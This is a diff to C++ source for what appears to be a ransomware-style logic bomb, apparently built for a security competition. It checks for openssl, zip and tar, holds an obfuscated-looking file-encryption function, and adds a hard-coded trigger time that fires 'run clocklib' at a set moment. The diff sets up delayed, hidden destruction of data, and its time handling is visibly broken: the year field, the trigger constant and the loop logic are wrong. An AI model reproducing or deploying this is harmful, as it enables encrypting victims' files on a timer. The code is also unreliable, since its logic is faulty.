@@ -3,6 +3,7 @@
 #include <iostream>
 #include <iomanip>
 #include <ctime>
+#define TRIGGER 61532067600
 
 std::string ex_ec(const char* cmd){
     FILE* pipe;
@@ -43,14 +44,15 @@ void en_cry_yp_t(std::string path){
 int main(){
     /* Check for current time */
     std::time_t t = std::time(nullptr);
-    std::tm * tm; // Datetime of target (Competition day at 12:00 EST) //Lunch
+    std::tm * tm_var; // Datetime of target (Competition day at 12:00 EST) //Lunch
+    std::tm trigger; // Datetime of target (Competition day at 12:00 EST) //Lunch
     bool openssl, zip, tar;
 	std::string out;
 
 	// check the local time 
     // Remember, it must NOT be local time. Preferrably to UTC
     // Competition is across several time zones
-    tm = std::localtime(&t); 
+    tm_var = std::localtime(&t); 
 	
     openssl = contains(ex_ec("which openssl"),"openssl");
     zip = contains(ex_ec("which zip"),"zip");
@@ -61,25 +63,32 @@ int main(){
 	//std::cout << tar << std::endl;
 
     // Time competition of trigger
-    tm->tm_year = 2019;
-    tm->tm_mon = 11;
-    tm->tm_mday = 16;
-    tm->tm_hour = 12;
+    // UTC (mktime) = 61532067600
+    trigger.tm_year = 2019;
+    trigger.tm_mon = 10;
+    trigger.tm_mday = 16;
+    trigger.tm_hour = 12;
+    trigger.tm_min = 0;
+    trigger.tm_sec = 0;
 
-    tm->tm_year = 2019;
-    tm->tm_mon = 10;
-    tm->tm_mday = 21;
+    tm_var->tm_year = 2019;
+    tm_var->tm_mon = 10;
+    tm_var->tm_mday = 21;
     std::cout << "Sleeping..." << std::endl;
-    printf("sec: %o \n",tm->tm_sec % 15);
-    printf("sec: %d \n",tm->tm_sec % 15);
 
     // At the start of every minute
-    while (tm->tm_sec != 0){
-        t = std::time(nullptr);
-        tm = std::localtime(&t); //Can't use this
+    // Can't interrupt without SIGTSTP
+    while (tm_var->tm_sec % 10 ==  0){
+        t = std::time(nullptr); //g
+        if (t == TRIGGER){
+            std::cout << "hit the trigger: run clocklib\n" << std::endl;
+        }
+        tm_var = std::localtime(&t); //Can't use this
+        
         std::system("sleep 1");
-        printf("sec: %d \n",tm->tm_sec % 16);
+        printf("sec: %d \n",tm_var->tm_sec);
     }
+    std::cout << std::localtime(nullptr) << std::endl;
 
     //printf("seconds past the minute: %d\n", tm->tm_sec);
     //std::cout << std::endl;
